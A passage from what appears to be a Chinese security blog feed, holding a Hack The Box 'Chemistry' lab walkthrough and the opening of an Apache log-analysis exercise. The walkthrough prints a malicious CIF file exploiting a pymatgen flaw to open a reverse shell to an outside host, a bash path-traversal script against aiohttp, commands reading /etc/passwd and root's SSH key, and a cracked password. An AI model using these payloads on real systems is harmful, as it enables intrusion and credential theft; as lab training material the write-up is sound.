class="hljs-keyword">II</span>=I%<span class="hljs-keyword">TS</span>=A)</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">OS</span>:OPS(<span class="hljs-keyword">O1</span>=<span class="hljs-keyword">M53AST11NW7</span>%<span class="hljs-keyword">O2</span>=<span class="hljs-keyword">M53AST11NW7</span>%<span class="hljs-keyword">O3</span>=<span class="hljs-keyword">M53ANNT11NW7</span>%<span class="hljs-keyword">O4</span>=<span class="hljs-keyword">M53AST11NW7</span>%<span class="hljs-keyword">O5</span>=<span class="hljs-keyword">M53A</span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">OS</span>:<span class="hljs-keyword">ST11NW7</span>%<span class="hljs-keyword">O6</span>=<span class="hljs-keyword">M53AST11</span>)WIN(<span class="hljs-keyword">W1</span>=<span class="hljs-keyword">FE88</span>%<span class="hljs-keyword">W2</span>=<span class="hljs-keyword">FE88</span>%<span class="hljs-keyword">W3</span>=<span class="hljs-keyword">FE88</span>%<span class="hljs-keyword">W4</span>=<span class="hljs-keyword">FE88</span>%<span class="hljs-keyword">W5</span>=<span class="hljs-keyword">FE88</span>%<span class="hljs-keyword">W6</span>=<span class="hljs-keyword">FE88</span>)</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">OS</span>:ECN(R=Y%<span class="hljs-keyword">DF</span>=Y%T=40%W=<span class="hljs-keyword">FAF</span>0%O=<span class="hljs-keyword">M53ANNSNW7</span>%<span class="hljs-keyword">CC</span>=Y%Q=)T1(R=Y%<span class="hljs-keyword">DF</span>=Y%T=40%S=O%A=S+%</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">OS</span>:F=<span class="hljs-keyword">AS</span>%<span class="hljs-keyword">RD</span>=0%Q=)T2(R=N)T3(R=N)T4(R=Y%<span class="hljs-keyword">DF</span>=Y%T=40%W=0%S=A%A=Z%F=R%O=%<span class="hljs-keyword">RD</span>=0%Q=)T</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">OS</span>:5(R=Y%<span class="hljs-keyword">DF</span>=Y%T=40%W=0%S=Z%A=S+%F=<span class="hljs-keyword">AR</span>%O=%<span class="hljs-keyword">RD</span>=0%Q=)T6(R=Y%<span class="hljs-keyword">DF</span>=Y%T=40%W=0%S=A%A=</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">OS</span>:Z%F=R%O=%<span class="hljs-keyword">RD</span>=0%Q=)T7(R=Y%<span class="hljs-keyword">DF</span>=Y%T=40%W=0%S=Z%A=S+%F=<span class="hljs-keyword">AR</span>%O=%<span class="hljs-keyword">RD</span>=0%Q=)U1(R=Y%<span class="hljs-keyword">DF</span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">OS</span>:=N%T=40%<span class="hljs-keyword">IPL</span>=164%<span class="hljs-keyword">UN</span>=0%<span class="hljs-keyword">RIPL</span>=G%<span class="hljs-keyword">RID</span>=G%<span class="hljs-keyword">RIPCK</span>=G%<span class="hljs-keyword">RUCK</span>=<span class="hljs-keyword">FA57</span>%<span class="hljs-keyword">RUD</span>=G)IE(R=Y%<span class="hljs-keyword">DFI</span>=N%T</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">OS</span>:=40%<span class="hljs-keyword">CD</span>=S)</span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">Network</span> <span class="hljs-keyword">Distance</span>: 3 <span class="hljs-keyword">hops</span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">Service</span> <span class="hljs-keyword">Info</span>: <span class="hljs-keyword">OS</span>: <span class="hljs-keyword">Linux</span>; <span class="hljs-keyword">CPE</span>: <span class="hljs-keyword">cpe</span>:/o:linux:linux_kernel</span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">TRACEROUTE</span> (<span class="hljs-keyword">using</span> <span class="hljs-keyword">port</span> 993/<span class="hljs-keyword">tcp</span>)</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">HOP</span> <span class="hljs-keyword">RTT</span>       <span class="hljs-keyword">ADDRESS</span></span></span><br><span class="hljs-meta"><span class="language-xml">1   0.27 <span class="hljs-keyword">ms</span>   172.30.144.1</span></span><br><span class="hljs-meta"><span class="language-xml">2   374.51 <span class="hljs-keyword">ms</span> 10.10.16.1</span></span><br><span class="hljs-meta"><span class="language-xml">3   374.69 <span class="hljs-keyword">ms</span> 10.10.11.38</span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">OS</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">Service</span> <span class="hljs-keyword">detection</span> <span class="hljs-keyword">performed</span>. <span class="hljs-keyword">Please</span> <span class="hljs-keyword">report</span> <span class="hljs-keyword">any</span> <span class="hljs-keyword">incorrect</span> <span class="hljs-keyword">results</span> <span class="hljs-keyword">at</span> <span class="hljs-keyword">https</span>://nmap.org/submit/ .</span></span><br><span class="hljs-meta"><span class="language-xml"><span class="hljs-keyword">Nmap</span> <span class="hljs-keyword">done</span>: 1 <span class="hljs-keyword">IP</span> <span class="hljs-keyword">address</span> (1 <span class="hljs-keyword">host</span> <span class="hljs-keyword">up</span>) <span class="hljs-keyword">scanned</span> <span class="hljs-keyword">in</span> 154.02 <span class="hljs-keyword">seconds</span></span></span><br></code></pre></td></tr></table></figure><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs inform7">How many <span class="hljs-keyword">open</span> TCP ports <span class="hljs-keyword">are</span> listening on Chemistry?<br>:2<br></code></pre></td></tr></table></figure><h1 id="Task-2"><a href="#Task-2" class="headerlink" title="Task 2"></a>Task 2</h1><p>æ³¨å†Œè´¦å·è¿›å»æŸ¥çœ‹æºç </p><p><img src="https://img.dkdun.cn/v1/2025/12/fa765fa0bed88a25.png"></p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-title class_">What</span> is the path of the example <span class="hljs-title class_">CIF</span> file available <span class="hljs-keyword">in</span> the dashboard?<br><span class="hljs-symbol">:/static/example</span>.cif<br></code></pre></td></tr></table></figure><h1 id="Task-3"><a href="#Task-3" class="headerlink" title="Task 3"></a>Task 3</h1><p><a href="https://github.com/advisories/GHSA-vgv8-5cpj-qj2f">https://github.com/advisories/GHSA-vgv8-5cpj-qj2f</a></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-keyword">the</span> <span class="hljs-number">2024</span> CVE ID <span class="hljs-keyword">for</span> <span class="hljs-keyword">a</span> vulnerability related <span class="hljs-built_in">to</span> parsing CIF <span class="hljs-built_in">files</span> <span class="hljs-keyword">using</span> <span class="hljs-keyword">a</span> Python library?<br>:CVE<span class="hljs-number">-2024</span><span class="hljs-number">-23346</span><br></code></pre></td></tr></table></figure><h1 id="Task-4"><a href="#Task-4" class="headerlink" title="Task 4"></a>Task 4</h1><p>POC æ”¹ä¸€ä¸‹ï¼Œå°è¯•åå¼¹ shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">data_5yOhtAoR<br>_audit_creation_date            <span class="hljs-number">2018</span>-06-08<br>_audit_creation_method          <span class="hljs-string">&quot;Pymatgen CIF Parser Arbitrary Code Execution Exploit&quot;</span><br><br>loop_<br>_parent_propagation_vector.<span class="hljs-built_in">id</span><br>_parent_propagation_vector.kxkykz<br>k1 [<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br><br>_space_group_magn.transform_BNS_Pp_abc  <span class="hljs-string">&#x27;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[&quot;__sub&quot; + &quot;classes__&quot;]) () if d.__name__ == &quot;BuiltinImporter&quot;][0].load_module (&quot;os&quot;).system (&quot;/bin/bash -c \&#x27;sh -i &gt;&amp; /dev/tcp/10.10.16.15/1234 0&gt;&amp;1\&#x27;&quot;);0,0,0&#x27;</span><br><br><br>_space_group_magn.number_BNS  <span class="hljs-number">62.448</span><br>_space_group_magn.name_BNS  <span class="hljs-string">&quot;P  n&#x27;  m  a&#x27;  &quot;</span><br></code></pre></td></tr></table></figure><p>ç›‘å¬</p><p><img src="https://img.dkdun.cn/v1/2025/12/85bf413a399b1f76.png"></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What user <span class="hljs-keyword">the</span> CIF Analyzer web <span class="hljs-built_in">application</span> <span class="hljs-built_in">running</span> <span class="hljs-keyword">as</span>?<br>:app<br></code></pre></td></tr></table></figure><h1 id="Task-5"><a href="#Task-5" class="headerlink" title="Task 5"></a>Task 5</h1><p><code>instance</code> ç›®å½•ä¸‹æœ‰ä¸€ä¸ª <code>database.db</code> æ–‡ä»¶</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-keyword">the</span> name <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> sqlite database <span class="hljs-built_in">file</span> used <span class="hljs-keyword">by</span> <span class="hljs-keyword">the</span> CIF analyzer web application?<br>:database.db<br></code></pre></td></tr></table></figure><h1 id="Task-6"><a href="#Task-6" class="headerlink" title="Task 6"></a>Task 6</h1><p><img src="https://img.dkdun.cn/v1/2025/12/08ffe3c1d94c3c58.png"></p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ldif"><span class="hljs-attribute">63ed86ee9f624c7b14f1d4f43dc251a5</span>:unicorniosrosados<br></code></pre></td></tr></table></figure><p>æ‹¿åˆ°ç”¨æˆ·åå’Œå¯†ç </p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">rose:</span>unicorniosrosados<br></code></pre></td></tr></table></figure><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">What <span class="hljs-keyword">is</span> the rosa user<span class="hljs-symbol">&#x27;s</span> password <span class="hljs-keyword">on</span> Chemistry?<br>:unicorniosrosados<br></code></pre></td></tr></table></figure><h1 id="Submit-User-Flag"><a href="#Submit-User-Flag" class="headerlink" title="Submit User Flag"></a>Submit User Flag</h1><p>ssh è¿æ¥</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">Submit the flag located in the rosa user&#x27;s home directory.<br>:<span class="hljs-number">86951223</span>f53c1ebf7cf<span class="hljs-number">0107</span>fed0df534<br></code></pre></td></tr></table></figure><h1 id="Task-8"><a href="#Task-8" class="headerlink" title="Task 8"></a>Task 8</h1><p>ç”¨ <code>netstat</code> æŸ¥çœ‹ä¸€ä¸‹ç½‘ç»œçŠ¶å†µ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netstat -ano<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/bba66c3120044f20.png"></p><p>æœ¬åœ°æœ‰ 8080 ç«¯å£</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">What TCP port that <span class="hljs-keyword">is</span> listneing only on the localhost <span class="hljs-keyword">interface</span> <span class="hljs-symbol">and</span> <span class="hljs-symbol">hosting</span> <span class="hljs-symbol">a</span> <span class="hljs-symbol">webserver</span>?<br>:<span class="hljs-symbol">8080</span><br></code></pre></td></tr></table></figure><h1 id="Task-9"><a href="#Task-9" class="headerlink" title="Task 9"></a>Task 9</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">rosa@chemiscurl -I http://127.0.0.1:8080<br>HTTP/1.1 200 OK<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 5971<br>Date: Sat, 22 Mar 2025 12:13:29 GMT<br>Server: Python/3.9 aiohttp/3.9.1<br></code></pre></td></tr></table></figure><p>ä» <code>curl</code> æƒ…å†µå‘ç°æœåŠ¡å™¨ä¸º <code>aiohttp</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What <span class="hljs-keyword">is</span> the <span class="hljs-type">name</span> <span class="hljs-keyword">of</span> the <span class="hljs-keyword">server</span> application hosting the <span class="hljs-type">internal</span> website?<br>:aiohttp<br></code></pre></td></tr></table></figure><h1 id="Task-10"><a href="#Task-10" class="headerlink" title="Task 10"></a>Task 10</h1><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What <span class="hljs-built_in">version</span> <span class="hljs-keyword">of</span> AIOHTTP <span class="hljs-keyword">is</span> <span class="hljs-built_in">running</span> <span class="hljs-keyword">on</span> TCP port <span class="hljs-number">8080</span>?<br>:<span class="hljs-number">3.9</span><span class="hljs-number">.1</span><br></code></pre></td></tr></table></figure><h1 id="Task-11"><a href="#Task-11" class="headerlink" title="Task 11"></a>Task 11</h1><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What is <span class="hljs-keyword">the</span> <span class="hljs-number">2024</span> CVE ID <span class="hljs-keyword">for</span> <span class="hljs-keyword">a</span> <span class="hljs-built_in">directory</span> traversal vulnerability <span class="hljs-keyword">in</span> AIOHTTP?<br>:CVE<span class="hljs-number">-2024</span><span class="hljs-number">-23334</span><br></code></pre></td></tr></table></figure><h1 id="Submit-Root-Flag"><a href="#Submit-Root-Flag" class="headerlink" title="Submit Root Flag"></a>Submit Root Flag</h1><p>POCï¼š<a href="https://github.com/s4botai/CVE-2024-23334-PoC">https://github.com/s4botai/CVE-2024-23334-PoC</a></p><p>é€šè¿‡ curl èƒ½æ‰¾åˆ°ç›®å½•</p><p><img src="https://img.dkdun.cn/v1/2025/12/121a945627060caa.png"></p><p>Pocï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash </span><br><br><br><br><span class="hljs-comment">#Colours</span><br>greenColour=<span class="hljs-string">&quot;\e[0;32m\033[1m&quot;</span><br>endColour=<span class="hljs-string">&quot;\033[0m\e[0m&quot;</span><br>redColour=<span class="hljs-string">&quot;\e[0;31m\033[1m&quot;</span><br>blueColour=<span class="hljs-string">&quot;\e[0;34m\033[1m&quot;</span><br>yellowColour=<span class="hljs-string">&quot;\e[0;33m\033[1m&quot;</span><br>purpleColour=<span class="hljs-string">&quot;\e[0;35m\033[1m&quot;</span><br>turquoiseColour=<span class="hljs-string">&quot;\e[0;36m\033[1m&quot;</span><br>grayColour=<span class="hljs-string">&quot;\e[0;37m\033[1m&quot;</span><br><br><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">helpPanel</span></span>()&#123;<br><br>  <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n<span class="hljs-variable">$&#123;redColour&#125;</span>[!] Usage: $0<span class="hljs-variable">$&#123;endColour&#125;</span>&quot;</span><br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">seq</span> 1 80); <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> -ne <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;redColour&#125;</span>-&quot;</span>; <span class="hljs-keyword">done</span>; <span class="hljs-built_in">echo</span> -ne <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;endColour&#125;</span>&quot;</span><br>  <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n\n\t<span class="hljs-variable">$&#123;grayColour&#125;</span>[-u]<span class="hljs-variable">$&#123;endColour&#125;</span> <span class="hljs-variable">$&#123;yellowColour&#125;</span>Url to attack<span class="hljs-variable">$&#123;endColour&#125;</span>&quot;</span><br>  <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n\t<span class="hljs-variable">$&#123;grayColour&#125;</span>[-f]<span class="hljs-variable">$&#123;endColour&#125;</span> <span class="hljs-variable">$&#123;yellowColour&#125;</span>File to read<span class="hljs-variable">$&#123;endColour&#125;</span>\n&quot;</span><br><br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-function"><span class="hljs-title">sendPayload</span></span>()&#123;<br><br>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">seq</span> 1 15); <span class="hljs-keyword">do</span> <br>    <br>    string=<span class="hljs-string">&quot;../&quot;</span><br>    payload+=<span class="hljs-variable">$string</span><br>    <span class="hljs-built_in">command</span>=$(curl -s -o /dev/null --path-as-is -w %&#123;http_code&#125; <span class="hljs-string">&quot;$url$payload<span class="hljs-variable">$file</span>&quot;</span>)<br>  <br>    <span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$command</span> -eq 200 ]]; <span class="hljs-keyword">then</span><br>      <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n<span class="hljs-variable">$&#123;grayColour&#125;</span>[+]<span class="hljs-variable">$&#123;endColour&#125;</span> <span class="hljs-variable">$&#123;yellowColour&#125;</span>The payload<span class="hljs-variable">$&#123;endColour&#125;</span> <span class="hljs-variable">$&#123;greenColour&#125;</span>$url$payload$file<span class="hljs-variable">$&#123;endColour&#125;</span> <span class="hljs-variable">$&#123;yellowColour&#125;</span>returned the following content</span><br><span class="hljs-string">:\n<span class="hljs-variable">$&#123;endColour&#125;</span>&quot;</span><br>      curl -s --path-as-is $url$payload<span class="hljs-variable">$file</span><br>      <span class="hljs-built_in">break</span><br>    <span class="hljs-keyword">fi</span><br><br><br>  <span class="hljs-keyword">done</span><br>&#125;<br><br><span class="hljs-keyword">while</span> <span class="hljs-built_in">getopts</span> <span class="hljs-string">&quot;u:f:h:&quot;</span> arg; <span class="hljs-keyword">do</span> <br><br>  <span class="hljs-keyword">case</span> <span class="hljs-variable">$arg</span> <span class="hljs-keyword">in</span><br>    u) url=<span class="hljs-variable">$OPTARG</span>; <span class="hljs-built_in">let</span> parameter_counter+=1;;<br>    f) file=<span class="hljs-variable">$OPTARG</span>; <span class="hljs-built_in">let</span> parameter_counter+=1;;<br>    h) helpPanel;;<br><br>  <span class="hljs-keyword">esac</span><br>  <br><span class="hljs-keyword">done</span><br><br><span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$parameter_counter</span> -eq 0 ]]; <span class="hljs-keyword">then</span> <br><br>  helpPanel<br><br><span class="hljs-keyword">else</span> <br><br>  sendPayload<br><br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p>å°è¯•è¯»å–  <code>/etc/passwd</code> ä¸‹çš„å†…å®¹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash lfi.sh -u http://localhost:8080/assets/ -f /etc/passwd<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/6f3c3381c22a1879.png"></p><p>æˆåŠŸäº†ï¼Œç»§ç»­è¯»å– <code>/root/.ssh</code> ä¸‹çš„ root ç”¨æˆ·çš„ç§é’¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash lfi.sh -u http://localhost:8080/assets/ -f /root/.ssh/id_rsa<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/06289e45d91234d1.png"></p><p>æ‹¿åˆ°ç§é’¥ä¹‹ååˆ›å»ºä¸€ä¸ªå­˜æ”¾ç§é’¥çš„æ–‡ä»¶ <code>id_rsa</code>ï¼Œç„¶åç»™äºˆæƒé™ï¼Œç”¨å¯†é’¥ç™»å½• ssh æœåŠ¡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 600 id_rsa<br>ssh root@10.10.11.38 -i id_rsa<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/1d8933ef55427379.png"></p><p>æ‹¿åˆ° root çš„ flag</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-punctuation">-</span>Submit the flag located in the root user&#x27;s home directory.<br>:<span class="hljs-number">7740</span>ea93f919b1f5c96d93df2f2a44cd<br></code></pre></td></tr></table></figure><h1 id="CVE-2024-23334"><a href="#CVE-2024-23334" class="headerlink" title="CVE-2024-23334"></a>CVE-2024-23334</h1><p>è¯¦ç»†å†…å®¹ï¼š<a href="https://github.com/aio-libs/aiohttp/security/advisories/GHSA-5h86-8mv2-jq9f">https://github.com/aio-libs/aiohttp/security/advisories/GHSA-5h86-8mv2-jq9f</a></p><p>When using aiohttp as a web server and configuring static routes, it is necessary to specify the root path for static files. Additionally, the option â€˜follow_symlinksâ€™ can be used to determine whether to follow symbolic links outside the static root directory. When â€˜follow_symlinksâ€™ is set to True, there is no validation to check if a given file path is within the root directory.This can lead to directory traversal vulnerabilities, resulting in unauthorized access to arbitrary files on the system, even when symlinks are not present.</p><p>ä½¿ç”¨ aiohttp ä½œä¸º Web æœåŠ¡å™¨å¹¶é…ç½®é™æ€è·¯ç”±æ—¶ï¼Œéœ€è¦æŒ‡å®šé™æ€æ–‡ä»¶çš„æ ¹è·¯å¾„ã€‚æ­¤å¤–ï¼Œé€‰é¡¹  <code>&#39;follow_symlinks&#39;</code> å¯ç”¨äºç¡®å®šæ˜¯å¦éµå¾ªé™æ€æ ¹ç›®å½•ä¹‹å¤–çš„ç¬¦å·é“¾æ¥ã€‚å½“ <code>&#39;follow_symlinks&#39;</code>  è®¾ç½®ä¸º True æ—¶ï¼Œä¸ä¼šè¿›è¡ŒéªŒè¯æ¥æ£€æŸ¥ç»™å®šçš„æ–‡ä»¶è·¯å¾„æ˜¯å¦åœ¨æ ¹ç›®å½•ä¸­ã€‚è¿™å¯èƒ½å¯¼è‡´ç›®å½•éå†æ¼æ´ï¼Œå¯¼è‡´æœªç»æˆæƒè®¿é—®ç³»ç»Ÿä¸Šçš„ä»»æ„æ–‡ä»¶ï¼Œå³ä½¿ç¬¦å·é“¾æ¥ä¸å­˜åœ¨ä¹Ÿæ˜¯å¦‚æ­¤ã€‚</p><p>æ¯”å¦‚è¿™ä¸ªä¾‹å­</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">app.<span class="hljs-property">router</span>.<span class="hljs-title function_">add_routes</span>([<br>    web.<span class="hljs-title function_">static</span>(<span class="hljs-string">&quot;/static&quot;</span>, <span class="hljs-string">&quot;static/&quot;</span>, follow_symlinks=<span class="hljs-title class_">True</span>),  # <span class="hljs-title class_">Remove</span> follow_symlinks to avoid the vulnerability<br>])<br></code></pre></td></tr></table></figure><p>é‡Œé¢çš„ <code>follow_symlinks=True</code> ä¼šå¯¼è‡´ç›®å½•éå†äº§ç”Ÿä»»æ„æ–‡ä»¶è¯»å–</p>]]></content>
    
    
    <categories>
      
      <category>æ¸—é€</category>
      
      <category>é¶æœº</category>
      
      <category>HTB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HTB æ¸—é€</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç„æœº-ç¬¬äºŒç« </title>
    <link href="/2025/03/20/%E7%8E%84%E6%9C%BA-%E7%AC%AC%E4%BA%8C%E7%AB%A0/"/>
    <url>/2025/03/20/%E7%8E%84%E6%9C%BA-%E7%AC%AC%E4%BA%8C%E7%AB%A0/</url>
    
    <content type="html"><![CDATA[<p>apache æ—¥å¿—åˆ†æ &amp; mysql åº”æ€¥å“åº” &amp; redis åº”æ€¥å“åº”</p><span id="more"></span><h1 id="apache-æ—¥å¿—åˆ†æ"><a href="#apache-æ—¥å¿—åˆ†æ" class="headerlink" title="apache æ—¥å¿—åˆ†æ"></a>apache æ—¥å¿—åˆ†æ</h1><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">è´¦å·å¯†ç  root apacherizhi<br>ssh root@<span class="hljs-built_in">IP</span><br><span class="hljs-number">1</span>ã€æäº¤å½“å¤©è®¿é—®æ¬¡æ•°æœ€å¤šçš„<span class="hljs-built_in">IP</span>ï¼Œå³é»‘å®¢<span class="hljs-built_in">IP</span>ï¼š<br><span class="hljs-number">2</span>ã€é»‘å®¢ä½¿ç”¨çš„æµè§ˆå™¨æŒ‡çº¹æ˜¯ä»€ä¹ˆï¼Œæäº¤æŒ‡çº¹çš„md5ï¼š<br><span class="hljs-number">3</span>ã€æŸ¥çœ‹åŒ…å«index<span class="hljs-number">.</span>phpé¡µé¢è¢«è®¿é—®çš„æ¬¡æ•°ï¼Œæäº¤æ¬¡æ•°ï¼š<br><span class="hljs-number">4</span>ã€æŸ¥çœ‹é»‘å®¢<span class="hljs-built_in">IP</span>è®¿é—®äº†å¤šå°‘æ¬¡ï¼Œæäº¤æ¬¡æ•°ï¼š<br><span class="hljs-number">5</span>ã€æŸ¥çœ‹<span class="hljs-number">2023</span>å¹´<span class="hljs-number">8</span>æœˆ<span class="hljs-number">03</span>æ—¥<span class="hljs-number">8</span>æ—¶è¿™ä¸€ä¸ªå°æ—¶å†…æœ‰å¤šå°‘<span class="hljs-built_in">IP</span>è®¿é—®ï¼Œæäº¤æ¬¡æ•°:<br></code></pre></td></tr></table></figure><h2 id="Q1"><a href="#Q1" class="headerlink" title="Q1"></a>Q1</h2><p>åœ¨ apache2 æ—¥å¿—ä¸­è¿‡æ»¤å‡ºè®¿é—®æ¬¡æ•°æœ€å¤šçš„ IP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cut</span> -d- -f 1 access.log.1 | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -rn<br><br><span class="hljs-comment"># cut:ä»æ¯è¡Œä¸­æå–æŒ‡å®šå­—æ®µ</span><br><span class="hljs-comment"># -d-:æŒ‡å®šåˆ†éš”ç¬¦ä¸º -</span><br><span class="hljs-comment"># -f 1:æŒ‡å®šè¦æå–ç¬¬ä¸€ä¸ªå­—æ®µ</span><br><span class="hljs-comment"># uniq -c:åˆ é™¤é‡å¤çš„è¡Œï¼Œåªç»Ÿè®¡å”¯ä¸€å‡ºç°çš„æ¬¡æ•°</span><br><span class="hljs-comment"># 